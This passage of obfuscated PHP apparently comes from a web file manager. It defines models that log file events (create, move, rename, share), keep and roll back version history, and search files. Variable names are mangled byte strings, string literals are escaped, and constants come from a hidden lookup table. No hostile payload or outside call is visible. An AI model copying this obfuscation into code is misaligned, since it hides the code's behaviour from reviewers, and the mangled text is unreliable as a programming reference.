unset(self::$data[$ì®¶î¬]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[§ŒØóıü][839])) { self::$handle->clearTimeout(); } } } goto d¥ÆÔ‹·İ½; cÒêÒÖ³ˆÏ: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\x72\x63\x65\137\x65\166\x65\156\164"; protected $dataAuto = array(array("\x63\162\x65\x61\164\x65\x54\151\x6d\145", "\164\x69\x6d\145", "\x69\x6e\163\x65\x72\164", "\146\165\x6e\x63\164\x69\157\x6e"), array("\144\145\163\143", '', "\151\156\x73\145\162\x74\x2c\x75\160\x64\141\164\x65\54\x73\145\154\x65\143\164", "\x6a\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($½à¾Ü¹¦, $°ÑÖôè , $ƒ‘İ¦—¥ = '') { $ ÛË¬Ô =& $_SERVER[§ŒØóıü]; if (!$this->eventSave) { return; } $€ç¹‡Éã = Model($ ÛË¬Ô[1345])->sourceInfo($½à¾Ü¹¦); if (!$€ç¹‡Éã) { return !1; } if ($this->isCacheEvent($€ç¹‡Éã, $°ÑÖôè )) { return; } if ($ƒ‘İ¦—¥ && is_string($ƒ‘İ¦—¥)) { $ƒ‘İ¦—¥ = array($ ÛË¬Ô[1901] => $ƒ‘İ¦—¥); } $ÚÎéŞ±± = array($ ÛË¬Ô[417] => $½à¾Ü¹¦, $ ÛË¬Ô[2083] => $€ç¹‡Éã[$ ÛË¬Ô[432]], $ ÛË¬Ô[2084] => $€ç¹‡Éã[$ ÛË¬Ô[32]], $ ÛË¬Ô[509] => !empty($€ç¹‡Éã[$ ÛË¬Ô[509]]) ? $€ç¹‡Éã[$ ÛË¬Ô[509]] : $ ÛË¬Ô[12], $ ÛË¬Ô[1664] => USER_ID, $ ÛË¬Ô[422] => $°ÑÖôè , $ ÛË¬Ô[1666] => $ƒ‘İ¦—¥); $this->addSystemLog($°ÑÖôè , $ÚÎéŞ±±); unset($ÚÎéŞ±±[$ ÛË¬Ô[2084]], $ÚÎéŞ±±[$ ÛË¬Ô[509]]); return $this->add($ÚÎéŞ±±); } private function addSystemLog($’Ì¸Úƒ‘, $¶ğ‡¸ê¶) { $õ›ßë =& $_SERVER[§ŒØóıü]; if ($’Ì¸Úƒ‘ == $õ›ßë[2085]) { $’Ì¸Úƒ‘ = $¶ğ‡¸ê¶[$õ›ßë[453]][$õ›ßë[2086]]; } else { if (in_array($’Ì¸Úƒ‘, array($õ›ßë[1842], $õ›ßë[2087]))) { $’Ì¸Úƒ‘ = $¶ğ‡¸ê¶[$õ›ßë[453]][$õ›ßë[760]]; } } $˜†»“–“ = array_merge($¶ğ‡¸ê¶, array($õ›ßë[2088] => $¶ğ‡¸ê¶[$õ›ßë[402]], $õ›ßë[2089] => $¶ğ‡¸ê¶[$õ›ßë[2089]])); Hook::trigger($õ›ßë[2090], $õ›ßë[2091] . $’Ì¸Úƒ‘, $¶ğ‡¸ê¶); Model($õ›ßë[1806])->addLog($õ›ßë[2091] . $’Ì¸Úƒ‘, $˜†»“–“); } private function isCacheEvent($—¦²©Ÿæ, $ğ—À’Ûü) { if ($—¦²©Ÿæ[$_SERVER[§ŒØóıü][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($é¡ÖĞúÎ, $øÒ¡ÎÀÒ) { $ğ¾§à‡• =& $_SERVER[§ŒØóıü]; $Éæ¨®µ› = Model($ğ¾§à‡•[1345])->sourceInfo($é¡ÖĞúÎ); $ùÁ…¥ó = array($ğ¾§à‡•[2086] => $øÒ¡ÎÀÒ, $ğ¾§à‡•[32] => $Éæ¨®µ›[$ğ¾§à‡•[32]]); return $this->addEvent($é¡ÖĞúÎ, $ğ¾§à‡•[2085], $ùÁ…¥ó); } public function eventFileEdit($şæâ—§) { $£«áÛÉ” =& $_SERVER[§ŒØóıü]; $Ñâ·§ Ñ = array($£«áÛÉ”[2092] => $_SERVER[$£«áÛÉ”[2093]], $£«áÛÉ”[2094] => strtolower(ACTION)); if (isset($GLOBALS[$£«áÛÉ”[7]][$£«áÛÉ”[2095]])) { $Ñâ·§ Ñ[$£«áÛÉ”[2095]] = $£«áÛÉ”[88]; } return $this->addEvent($şæâ—§, $£«áÛÉ”[1832], $Ñâ·§ Ñ); } public function eventRecycle($ÍØÂµûş, $Æ³­‰ù) { return $this->addEvent($ÍØÂµûş, $_SERVER[§ŒØóıü][2087], $Æ³­‰ù); } public function eventRemove($ŸŠŸ‹×¢) { $‡½ìÚ¾Ø =& $_SERVER[§ŒØóıü]; $ƒšÇÓ©à = Model($‡½ìÚ¾Ø[1345])->sourceInfo($ŸŠŸ‹×¢); $¬åå‡è„ = $ƒšÇÓ©à[$‡½ìÚ¾Ø[32]]; return $this->addEvent($ƒšÇÓ©à[$‡½ìÚ¾Ø[432]], $‡½ìÚ¾Ø[1831], $¬åå‡è„); } public function eventShare($ıƒ˜Úû±, $…«›¯Í›) { return $this->addEvent($ıƒ˜Úû±, $_SERVER[§ŒØóıü][1842], $…«›¯Í›); } public function eventMove($‡â¢¬öò, $“°§Ó‡°, $«‡¡£ùÌ) { $‚·Ô×¡İ =& $_SERVER[§ŒØóıü]; $†¤Úâïæ = Model($‚·Ô×¡İ[1345]); $Ş³ñàï÷ = $†¤Úâïæ->sourceInfo($‡â¢¬öò); $Ê—ĞÁç = $†¤Úâïæ->sourceInfo($“°§Ó‡°); $Ş‡µùÒ = $†¤Úâïæ->sourceInfo($«‡¡£ùÌ); $¿Æ‘ìÅ¸ = array($‚·Ô×¡İ[1166] => $“°§Ó‡°, $‚·Ô×¡İ[2096] => $Ê—ĞÁç[$‚·Ô×¡İ[32]], $‚·Ô×¡İ[2074] => !empty($Ê—ĞÁç[$‚·Ô×¡İ[509]]) ? $Ê—ĞÁç[$‚·Ô×¡İ[509]] : $‚·Ô×¡İ[12], $‚·Ô×¡İ[1167] => $«‡¡£ùÌ, $‚·Ô×¡İ[2097] => $Ş‡µùÒ[$‚·Ô×¡İ[32]], $‚·Ô×¡İ[2098] => !empty($Ş‡µùÒ[$‚·Ô×¡İ[509]]) ? $Ş‡µùÒ[$‚·Ô×¡İ[509]] : $‚·Ô×¡İ[12]); $this->addEvent($‡â¢¬öò, $‚·Ô×¡İ[548], $¿Æ‘ìÅ¸); $Ş³ñàï÷ = $†¤Úâïæ->sourceInfo($‡â¢¬öò); $¿Æ‘ìÅ¸ = array($‚·Ô×¡İ[402] => $Ş³ñàï÷[$‚·Ô×¡İ[402]], $‚·Ô×¡İ[32] => $Ş³ñàï÷[$‚·Ô×¡İ[32]]); $this->addEvent($“°§Ó‡°, $‚·Ô×¡İ[2099], $¿Æ‘ìÅ¸); } public function eventCopy($íºöÔ¹‰) { $this->eventCreate($íºöÔ¹‰, $_SERVER[§ŒØóıü][546]); } public function eventRename($Æ¡Õ™Â³, $øâ”ïÛß, $¨êØÂğ†) { $‹½ÄöÖÙ =& $_SERVER[§ŒØóıü]; $°§—÷ÂÕ = array($‹½ÄöÖÙ[1166] => $øâ”ïÛß, $‹½ÄöÖÙ[1167] => $¨êØÂğ†); return $this->addEvent($Æ¡Õ™Â³, $‹½ÄöÖÙ[1360], $°§—÷ÂÕ); } public function eventAddComment($é½€‰é˜, $Œš”š©ñ) { return $this->addEvent($é½€‰é˜, $_SERVER[§ŒØóıü][2100], $Œš”š©ñ); } public function eventAddDesc($êï¶¾å, $È”£ŸËÑ) { return $this->addEvent($êï¶¾å, $_SERVER[§ŒØóıü][2101], $È”£ŸËÑ); } public function listBySource($Ş’Í‹™) { $˜Ğ›„‰‚ =& $_SERVER[§ŒØóıü]; $’¨îÜ®ç = Model($˜Ğ›„‰‚[1345])->sourceInfo($Ş’Í‹™); $åšŞàïÒ = array($˜Ğ›„‰‚[417] => $Ş’Í‹™); if ($’¨îÜ®ç[$˜Ğ›„‰‚[410]] == $˜Ğ›„‰‚[88]) { $·²ê = Model($˜Ğ›„‰‚[1345])->listSearchChildren($Ş’Í‹™, 20000); $·²ê[] = $Ş’Í‹™ . $˜Ğ›„‰‚[378]; $åšŞàïÒ = array($˜Ğ›„‰‚[402] => array($˜Ğ›„‰‚[7], $·²ê)); } $‹»ŸœÚ = $this->where($åšŞàïÒ)->order($˜Ğ›„‰‚[2102])->selectPage(); if ($‹»ŸœÚ[$˜Ğ›„‰‚[366]][$˜Ğ›„‰‚[367]] == 0) { $‹»ŸœÚ[$˜Ğ›„‰‚[366]][$˜Ğ›„‰‚[367]] = 1; $‹»ŸœÚ[$˜Ğ›„‰‚[369]] = array(array($˜Ğ›„‰‚[417] => $Ş’Í‹™, $˜Ğ›„‰‚[2083] => $’¨îÜ®ç[$˜Ğ›„‰‚[432]], $˜Ğ›„‰‚[1664] => $’¨îÜ®ç[$˜Ğ›„‰‚[454]], $˜Ğ›„‰‚[422] => $˜Ğ›„‰‚[2103], $˜Ğ›„‰‚[423] => $’¨îÜ®ç[$˜Ğ›„‰‚[201]], $˜Ğ›„‰‚[1666] => $˜Ğ›„‰‚[12])); } return $this->eventListParse($‹»ŸœÚ, $Ş’Í‹™); } private function eventListParse($ğ¬Ö‘·ä, $Ìâ„·£) { $¤òˆÈ§æ =& $_SERVER[§ŒØóıü]; $Û®‡ˆú¢ = $ğ¬Ö‘·ä[$¤òˆÈ§æ[369]]; $Œ¹ÂÈŞÎ = array_to_keyvalue($Û®‡ˆú¢, $¤òˆÈ§æ[12], $¤òˆÈ§æ[402]); $¶¶°‚Ğ– = array_to_keyvalue($Û®‡ˆú¢, $¤òˆÈ§æ[12], $¤òˆÈ§æ[2089]); foreach ($Û®‡ˆú¢ as $Ğõ¨ÒŸ) { $ã’±‘ñ‚ = $Ğõ¨ÒŸ[$¤òˆÈ§æ[453]]; if ($Ğõ¨ÒŸ[$¤òˆÈ§æ[33]] == $¤òˆÈ§æ[548] && isset($ã’±‘ñ‚[$¤òˆÈ§æ[1166]])) { $Œ¹ÂÈŞÎ[] = $ã’±‘ñ‚[$¤òˆÈ§æ[1166]] . $¤òˆÈ§æ[12]; $Œ¹ÂÈŞÎ[] = $ã’±‘ñ‚[$¤òˆÈ§æ[1167]] . $¤òˆÈ§æ[12]; } if ($Ğõ¨ÒŸ[$¤òˆÈ§æ[33]] == $¤òˆÈ§æ[2099] && isset($ã’±‘ñ‚[$¤òˆÈ§æ[402]])) { $Œ¹ÂÈŞÎ[] = $ã’±‘ñ‚[$¤òˆÈ§æ[402]] . $¤òˆÈ§æ[12]; } } $Œ¹ÂÈŞÎ = array_merge($Œ¹ÂÈŞÎ, $¶¶°‚Ğ–, array($Ìâ„·£ . $¤òˆÈ§æ[12])); $Œ¹ÂÈŞÎ = array_unique($Œ¹ÂÈŞÎ); $³Ÿåçİë = array_unique(array_to_keyvalue($Û®‡ˆú¢, $¤òˆÈ§æ[12], $¤òˆÈ§æ[1673])); $¸æà¿İ = Model($¤òˆÈ§æ[525])->userListInfo($³Ÿåçİë); $º’Ù½‘ = Model($¤òˆÈ§æ[831])->sourceListInfo($Œ¹ÂÈŞÎ, !0); foreach ($Û®‡ˆú¢ as &$Ğõ¨ÒŸ) { if ($Ğõ¨ÒŸ[$¤òˆÈ§æ[33]] == $¤òˆÈ§æ[548] && isset($Ğõ¨ÒŸ[$¤òˆÈ§æ[453]][$¤òˆÈ§æ[1166]])) { $Ğõ¨ÒŸ[$¤òˆÈ§æ[453]][$¤òˆÈ§æ[1166]] = $º’Ù½‘[$Ğõ¨ÒŸ[$¤òˆÈ§æ[453]][$¤òˆÈ§æ[1166]]]; $Ğõ¨ÒŸ[$¤òˆÈ§æ[453]][$¤òˆÈ§æ[1167]] = $º’Ù½‘[$Ğõ¨ÒŸ[$¤òˆÈ§æ[453]][$¤òˆÈ§æ[1167]]]; } if ($Ğõ¨ÒŸ[$¤òˆÈ§æ[33]] == $¤òˆÈ§æ[2099] && isset($Ğõ¨ÒŸ[$¤òˆÈ§æ[453]][$¤òˆÈ§æ[402]])) { $Ğõ¨ÒŸ[$¤òˆÈ§æ[453]][$¤òˆÈ§æ[402]] = $º’Ù½‘[$Ğõ¨ÒŸ[$¤òˆÈ§æ[453]][$¤òˆÈ§æ[402]]]; } $Ğõ¨ÒŸ[$¤òˆÈ§æ[87]] = $º’Ù½‘[$Ğõ¨ÒŸ[$¤òˆÈ§æ[402]]]; $Ğõ¨ÒŸ[$¤òˆÈ§æ[2104]] = $º’Ù½‘[$Ğõ¨ÒŸ[$¤òˆÈ§æ[2089]]]; if ($Ğõ¨ÒŸ[$¤òˆÈ§æ[33]] == $¤òˆÈ§æ[1831]) { $Ğõ¨ÒŸ[$¤òˆÈ§æ[2104]] = $Ğõ¨ÒŸ[$¤òˆÈ§æ[87]]; $Ğõ¨ÒŸ[$¤òˆÈ§æ[2089]] = $Ğõ¨ÒŸ[$¤òˆÈ§æ[2104]][$¤òˆÈ§æ[402]]; $Ğõ¨ÒŸ[$¤òˆÈ§æ[87]] = !1; $Ğõ¨ÒŸ[$¤òˆÈ§æ[402]] = $¤òˆÈ§æ[12]; } $Ğõ¨ÒŸ[$¤òˆÈ§æ[2034]] = $¸æà¿İ[$Ğõ¨ÒŸ[$¤òˆÈ§æ[1673]]]; } unset($Ğõ¨ÒŸ); $ğ¬Ö‘·ä[$¤òˆÈ§æ[369]] = $Û®‡ˆú¢; return $ğ¬Ö‘·ä; } public function removeBySource($ï­–§) { $Ş¥èŞÍï = array($_SERVER[§ŒØóıü][417] => $ï­–§); $this->where($Ş¥èŞÍï)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\162\143\145\137\x68\151\x73\x74\x6f\162\x79"; public function historyCount($õø§Ì¨ñ) { $¦¿Ñ˜‡Î =& $_SERVER[§ŒØóıü]; if (!$õø§Ì¨ñ) { return array(); } if (is_string($õø§Ì¨ñ) || is_int($õø§Ì¨ñ)) { $õø§Ì¨ñ = array($õø§Ì¨ñ); } $‡ÆòÊ¨ = array($¦¿Ñ˜‡Î[402], $¦¿Ñ˜‡Î[1895] => $¦¿Ñ˜‡Î[491]); $ƒÉé—â = array($¦¿Ñ˜‡Î[402] => array($¦¿Ñ˜‡Î[7], $õø§Ì¨ñ)); $…ÌƒÜÙæ = $this->field($‡ÆòÊ¨)->where($ƒÉé—â)->group($¦¿Ñ˜‡Î[402])->select(); return array_to_keyvalue($…ÌƒÜÙæ, $¦¿Ñ˜‡Î[402], $¦¿Ñ˜‡Î[491]); } public function addHistory($‚€³¡¼Û, $ÁÀñ± Â = '') { $Ù÷ò‘¯¯ =& $_SERVER[§ŒØóıü]; $è´°¦ŒÒ = array($Ù÷ò‘¯¯[417] => $‚€³¡¼Û[$Ù÷ò‘¯¯[402]], $Ù÷ò‘¯¯[1664] => isset($‚€³¡¼Û[$Ù÷ò‘¯¯[456]]) ? $‚€³¡¼Û[$Ù÷ò‘¯¯[456]] : $‚€³¡¼Û[$Ù÷ò‘¯¯[454]], $Ù÷ò‘¯¯[469] => $‚€³¡¼Û[$Ù÷ò‘¯¯[468]], $Ù÷ò‘¯¯[545] => $‚€³¡¼Û[$Ù÷ò‘¯¯[76]], $Ù÷ò‘¯¯[2105] => $ÁÀñ± Â); if ($GLOBALS[$Ù÷ò‘¯¯[6]][$Ù÷ò‘¯¯[89]][$Ù÷ò‘¯¯[1223]] >= 1) { $this->historyAutoClear($è´°¦ŒÒ[$Ù÷ò‘¯¯[402]]); $this->add($è´°¦ŒÒ); } Hook::trigger($Ù÷ò‘¯¯[2106], $è´°¦ŒÒ); Model($Ù÷ò‘¯¯[2107])->eventFileEdit($‚€³¡¼Û[$Ù÷ò‘¯¯[402]]); } private function historyAutoClear($ÃÒ…Î‘¥) { $é‡À÷‰° =& $_SERVER[§ŒØóıü]; $ÄîğØêø = Model($é‡À÷‰°[776])->get($é‡À÷‰°[1245]); $ƒ–œŠ®¢ = $GLOBALS[$é‡À÷‰°[6]][$é‡À÷‰°[89]][$é‡À÷‰°[1223]]; $Ù™®°ïì = $ÄîğØêø == $é‡À÷‰°[1246] ? min(5, $ƒ–œŠ®¢) : $ƒ–œŠ®¢; $Ù™®°ïì = $Ù™®°ïì <= 0 ? 0 : $Ù™®°ïì - 1; if ($Ù™®°ïì >= 500) { return; } $–üÌö„ü = array($é‡À÷‰°[417] => $ÃÒ…Î‘¥); $íÁèä…æ = $this->field($é‡À÷‰°[2108])->where($–üÌö„ü)->order($é‡À÷‰°[2102])->select(); if (!$íÁèä…æ || $Ù™®°ïì >= count($íÁèä…æ)) { return; } $ÚóÕğâ = array_to_keyvalue($íÁèä…æ, $é‡À÷‰°[12], $é‡À÷‰°[399]); $ÚóÕğâ = array_slice($ÚóÕğâ, $Ù™®°ïì); $‰»ÎÖšé = array_to_keyvalue($íÁèä…æ, $é‡À÷‰°[12], $é‡À÷‰°[468]); $‰»ÎÖšé = array_slice($‰»ÎÖšé, $Ù™®°ïì); if (!$ÚóÕğâ || !$‰»ÎÖšé) { return; } $–üÌö„ü = array($é‡À÷‰°[419] => array($é‡À÷‰°[7], $ÚóÕğâ)); $this->where($–üÌö„ü)->delete(); Model($é‡À÷‰°[471])->remove($‰»ÎÖšé); } public function listData($È§ê¤†) { $ÃåÜÉûÊ =& $_SERVER[§ŒØóıü]; $ùÂïÄò = array($ÃåÜÉûÊ[417] => $È§ê¤†); $«—Ï¨ñ¿ = $ÃåÜÉûÊ[2109]; $áúĞ Ñ¸ = $this->field($«—Ï¨ñ¿)->where($ùÂïÄò)->order($ÃåÜÉûÊ[2102])->selectPage(); $this->_listAppendUser($áúĞ Ñ¸[$ÃåÜÉûÊ[369]]); $Â´—“½ = Model($ÃåÜÉûÊ[776])->get($ÃåÜÉûÊ[1245]); $ãÏ£Ñ‹ª = 5; if ($Â´—“½ == $ÃåÜÉûÊ[1246]) { $áúĞ Ñ¸[$ÃåÜÉûÊ[369]] = array_slice($áúĞ Ñ¸[$ÃåÜÉûÊ[369]], 0, $ãÏ£Ñ‹ª); $áúĞ Ñ¸[$ÃåÜÉûÊ[366]] = array($ÃåÜÉûÊ[2110] => 1, $ÃåÜÉûÊ[2111] => 20, $ÃåÜÉûÊ[2112] => 1, $ÃåÜÉûÊ[2113] => count($áúĞ Ñ¸[$ÃåÜÉûÊ[369]])); } return $áúĞ Ñ¸; } protected function _listAppendUser(&$Ôäó¢á ) { $ë©²ò¿ş =& $_SERVER[§ŒØóıü]; $‰€­ÅÆ = array_to_keyvalue($Ôäó¢á , $ë©²ò¿ş[12], $ë©²ò¿ş[1673]); $¿¢ğ¼ßı = Model($ë©²ò¿ş[525])->userListInfo($‰€­ÅÆ); foreach ($Ôäó¢á  as &$İÙ®ôËª) { $ÊŞ´ß×É = $İÙ®ôËª[$ë©²ò¿ş[1673]]; $İÙ®ôËª[$ë©²ò¿ş[454]] = $¿¢ğ¼ßı[$ÊŞ´ß×É] ? $¿¢ğ¼ßı[$ÊŞ´ß×É] : !1; } unset($İÙ®ôËª); } public function fileInfo($âš‡¼€ó) { $ÎœŠº€ß =& $_SERVER[§ŒØóıü]; $×¿î•»Ù = $this->tablePrefix; $–Ğ«¢Û½ = "{$×¿î•»Ù}\x69\x6f\137\x66\x69\154\x65\40\x66\151\x6c\145\x73\40\x6f\x6e\x20\146\x69\154\x65\163\56\146\x69\x6c\145\111\104\x20\75\40\150\x69\163\164\x6f\162\x79\x2e\x66\x69\154\x65\x49\104"; return $this->alias($ÎœŠº€ß[2114])->where(array($ÎœŠº€ß[419] => $âš‡¼€ó))->join($–Ğ«¢Û½, $ÎœŠº€ß[2115])->find(); } public function removeItem($ÅÑşîéü) { $¥ßÌŞìª =& $_SERVER[§ŒØóıü]; $ûÚíáùÓ = array($¥ßÌŞìª[419] => $ÅÑşîéü); $´¾İ÷Ì§ = $this->where($ûÚíáùÓ)->find(); if ($´¾İ÷Ì§) { $“û´ì§å = $this->where($ûÚíáùÓ)->delete(); Model($¥ßÌŞìª[471])->remove($´¾İ÷Ì§[$¥ßÌŞìª[468]]); return $“û´ì§å; } return !1; } public function removeBySource($º«²‰¼è) { $ôéïûôº =& $_SERVER[§ŒØóıü]; if (!$º«²‰¼è) { return !1; } if (!is_array($º«²‰¼è)) { $º«²‰¼è = array($º«²‰¼è); } $ğüÚ¢ÊŠ = array($ôéïûôº[417] => array($ôéïûôº[7], $º«²‰¼è)); $ÀÇÎ¾ò = $this->field($ôéïûôº[469])->where($ğüÚ¢ÊŠ)->select(); if ($ÀÇÎ¾ò) { $this->where($ğüÚ¢ÊŠ)->delete(); $¡¬ŸœÅ = array_to_keyvalue($ÀÇÎ¾ò, $ôéïûôº[12], $ôéïûôº[468]); Model($ôéïûôº[471])->remove($¡¬ŸœÅ); } return !0; } public function setDetail($É®¥Ü†á, $¥‡û¦ıÖ) { $ßÉˆÛ†¨ =& $_SERVER[§ŒØóıü]; return $this->where(array($ßÉˆÛ†¨[419] => $É®¥Ü†á))->save(array($ßÉˆÛ†¨[2105] => $¥‡û¦ıÖ)); } public function rollbackToItem($“òõíÁÇ, $úñúùÍõ) { $‚£‡îß =& $_SERVER[§ŒØóıü]; $„†²¯¤ = Model($‚£‡îß[831])->sourceInfo($“òõíÁÇ); $this->addHistory($„†²¯¤, LNG($‚£‡îß[2116])); $¬È ç‹À = $this->find($úñúùÍõ); $Ã¯—²ÀÛ = array($‚£‡îß[468] => $¬È ç‹À[$‚£‡îß[468]], $‚£‡îß[76] => $¬È ç‹À[$‚£‡îß[76]], $‚£‡îß[85] => time(), $‚£‡îß[456] => USER_ID); Model($‚£‡îß[831])->where(array($‚£‡îß[402] => $“òõíÁÇ))->save($Ã¯—²ÀÛ); return $this->where(array($‚£‡îß[419] => $úñúùÍõ))->delete(); } public function clearSame($úƒ”²Ã‹) { $»‚Š¢÷„ =& $_SERVER[§ŒØóıü]; $×÷şàœÙ = $this->listData($úƒ”²Ã‹); $…ä¨–Æ› = array_to_keyvalue_group($×÷şàœÙ, $»‚Š¢÷„[468]); $œáÌá† = array(); $äŸúö“ = array(); foreach ($…ä¨–Æ› as $Š“”ğÚØ) { if (!$Š“”ğÚØ || count($Š“”ğÚØ) <= 1) { continue; } foreach ($Š“”ğÚØ as $ƒ¿¤ş¢) { $œáÌá†[] = $ƒ¿¤ş¢[$»‚Š¢÷„[468]]; $äŸúö“[] = $ƒ¿¤ş¢[$»‚Š¢÷„[399]]; } } if (!$äŸúö“) { return; } $this->where(array($»‚Š¢÷„[399] => array($»‚Š¢÷„[7], $äŸúö“)))->delete(); Model($»‚Š¢÷„[471])->remove($œáÌá†); } public function userSpace() { $æŞ¶ú— =& $_SERVER[§ŒØóıü]; $˜øâ€ì„ = $this->tablePrefix; $ö°Â¶Š = array($æŞ¶ú—[1664] => USER_ID); $ÂÃÇŠ£Î = "{$˜øâ€ì„}\151\x6f\x5f\146\151\x6c\x65\40\x66\151\154\x65\163\40\157\x6e\x20\146\x69\154\x65\163\56\x66\151\x6c\145\x49\104\x20\75\x20\150\151\163\x74\157\162\x79\x2e\146\151\154\145\111\104"; return $this->alias($æŞ¶ú—[2114])->where($ö°Â¶Š)->join($ÂÃÇŠ£Î, $æŞ¶ú—[2115])->sum($æŞ¶ú—[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ŞÓÍ¤ßµ) { $½Ûßû¶ğ =& $_SERVER[§ŒØóıü]; $ÊùÉ²öÇ = KodIO::fileTypeList(); $ŞŸ¢Üè = $ÊùÉ²öÇ[$ŞÓÍ¤ßµ]; if (!$ŞŸ¢Üè) { return array(); } $€ù­ÂˆĞ = $ŞŸ¢Üè[$½Ûßû¶ğ[174]]; $òÏà˜‡Â = $½Ûßû¶ğ[7]; if (!$ŞŸ¢Üè[$½Ûßû¶ğ[174]]) { $´®¸Ü¦‰ = array_to_keyvalue($ÊùÉ²öÇ, $½Ûßû¶ğ[12], $½Ûßû¶ğ[174]); $€ù­ÂˆĞ = implode($½Ûßû¶ğ[50], $´®¸Ü¦‰); $òÏà˜‡Â = $½Ûßû¶ğ[2117]; } $ë¸ó„‹Ó = explode($½Ûßû¶ğ[50], trim($€ù­ÂˆĞ, $½Ûßû¶ğ[50])); return array($òÏà˜‡Â, $ë¸ó„‹Ó); } public function listPathType($şÈÁˆıÂ) { $‚ØÛä¨½ =& $_SERVER[§ŒØóıü]; $ô€˜ïé° = $this->fileTypeWhere($şÈÁˆıÂ); if (!$ô€˜ïé°) { return array(); } $Ç«ÈÈúË = USER_ID; $úœŞßáî = Model($‚ØÛä¨½[525])->getInfo($Ç«ÈÈúË); $¸šĞÃ”¹ = array($‚ØÛä¨½[576] => SourceModel::TYPE_USER, $‚ØÛä¨½[511] => array($‚ØÛä¨½[540], $‚ØÛä¨½[521] . $úœŞßáî[$‚ØÛä¨½[87]][$‚ØÛä¨½[402]] . $‚ØÛä¨½[541]), $‚ØÛä¨½[577] => $Ç«ÈÈúË, $‚ØÛä¨½[574] => 0, $‚ØÛä¨½[575] => $ô€˜ïé°); return $this->listSource($¸šĞÃ”¹); } public function listSearch($‘„¨®‹«, $’ËòÕœ† = 300) { $î·˜Û°… =& $_SERVER[§ŒØóıü]; if (isset($‘„¨®‹«[$î·˜Û°…[1956]]) && $‘„¨®‹«[$î·˜Û°…[1956]]) { $‘„¨®‹«[$î·˜Û°…[1956]] = str_replace($î·˜Û°…[384], $î·˜Û°…[2118], trim($‘„¨®‹«[$î·˜Û°…[1956]])); } $×‘øøÉ = $this->_parseSearchWhere($‘„¨®‹«); if (!isset($×‘øøÉ[$î·˜Û°…[431]])) { $×‘øøÉ[$î·˜Û°…[431]] = 0; } $ùõ“ÚÜ = $î·˜Û°…[2119]; $Ğºã²Ôİ = $×‘øøÉ; $ÜäŒÚ”— = $ùõ“ÚÜ; $this->_listSearchBindPinyin($‘„¨®‹«, $×‘øøÉ, $ùõ“ÚÜ); $this->alias($î·˜Û°…[446])->_makeOrder(); $×‘øøÉ = $this->parseWhereLike($×‘øøÉ); $ÛùàÈÆ = $this->distinct(!0)->field($ùõ“ÚÜ)->where($×‘øøÉ)->selectPage($’ËòÕœ†); if ($GLOBALS[$î·˜Û°…[6]][$î·˜Û°…[381]][$î·˜Û°…[382]] && Input::check($‘„¨®‹«[$î·˜Û°…[1956]], $î·˜Û°…[583]) && $ÛùàÈÆ[$î·˜Û°…[366]][$î·˜Û°…[353]] == 1 && $ÛùàÈÆ[$î·˜Û°…[366]][$î·˜Û°…[367]] == 0) { $ÛùàÈÆ = $this->distinct(!0)->field($ùõ“ÚÜ)->where($Ğºã²Ôİ)->limit(1000)->select(); $ÛùàÈÆ = array_page_split($ÛùàÈÆ, !1, $’ËòÕœ†); } $this->_listSearchFileContent($ÛùàÈÆ, $‘„¨®‹«, $ÜäŒÚ”—, $Ğºã²Ôİ); $this->_listSearchDesc($ÛùàÈÆ, $‘„¨®‹«, $ÜäŒÚ”—); $this->_listSearchTag($ÛùàÈÆ, $‘„¨®‹«, $ÜäŒÚ”—); $this->_listSearchGroupTag($ÛùàÈÆ, $‘„¨®‹«, $ÜäŒÚ”—); $this->_listDataApply($ÛùàÈÆ[$î·˜Û°…[369]]); $this->_listMake($ÛùàÈÆ); return $ÛùàÈÆ; } private function _listSearchFileContent(&$’¥Ôšæ, $ Ìà˜şê, $ùô¡é¯, $…¢‡ àì) { $õÔÂ£¾ =& $_SERVER[§ŒØóıü]; if (!$ Ìà˜şê[$õÔÂ£¾[1956]] || $’¥Ôšæ[$õÔÂ£¾[366]][$õÔÂ£¾[353]] > 1) { return; } if (!isset($…¢‡ àì[$õÔÂ£¾[32]]) || !is_array($ Ìà˜şê[$õÔÂ£¾[468]])) { return; } $…¢‡ àì[$õÔÂ£¾[468]] = array($õÔÂ£¾[7], $ Ìà˜şê[$õÔÂ£¾[468]]); unset($…¢‡ àì[$õÔÂ£¾[32]]); unset($ Ìà˜şê[$õÔÂ£¾[468]]); $Ñş‹í­ï = $this->field($ùô¡é¯)->where($…¢‡ àì)->limit($õÔÂ£¾[2120])->select(); if (!$Ñş‹í­ï || count($Ñş‹í­ï) == 0) { return; } $’¥Ôšæ[$õÔÂ£¾[369]] = array_merge($Ñş‹í­ï, $’¥Ôšæ[$õÔÂ£¾[369]]); $’¥Ôšæ[$õÔÂ£¾[366]][$õÔÂ£¾[367]] += count($Ñş‹í­ï); } private function _listSearchTag(&$ãìï—¹â, $øˆ¨™¶ , $ŒÈÌ•ÚÀ) { $›½¼§äŸ =& $_SERVER[§ŒØóıü]; if (!$øˆ¨™¶ [$›½¼§äŸ[1956]] || $ãìï—¹â[$›½¼§äŸ[366]][$›½¼§äŸ[353]] > 1) { return; } $ıÒíìõò = Model($›½¼§äŸ[2121])->listData(); $¶ á†üŠ = array(); $Ÿø¹ìÂø = $øˆ¨™¶ [$›½¼§äŸ[1956]]; foreach ($ıÒíìõò as $’º½‰¶Ñ) { $ŞŒ³› = $’º½‰¶Ñ[$›½¼§äŸ[32]]; $é›–¶şÖ = str_replace($›½¼§äŸ[53], $›½¼§äŸ[12], Pinyin::get($ŞŒ³›)); if (stripos($ŞŒ³›, $Ÿø¹ìÂø) !== !1 || stripos($é›–¶şÖ, $Ÿø¹ìÂø) !== !1) { $¶ á†üŠ[] = $’º½‰¶Ñ[$›½¼§äŸ[399]]; } } if (!$¶ á†üŠ) { return; } $¦Ğ¬ ˆæ = array($›½¼§äŸ[426] => array($›½¼§äŸ[7], $¶ á†üŠ), $›½¼§äŸ[1673] => USER_ID); $…Í…€¦© = 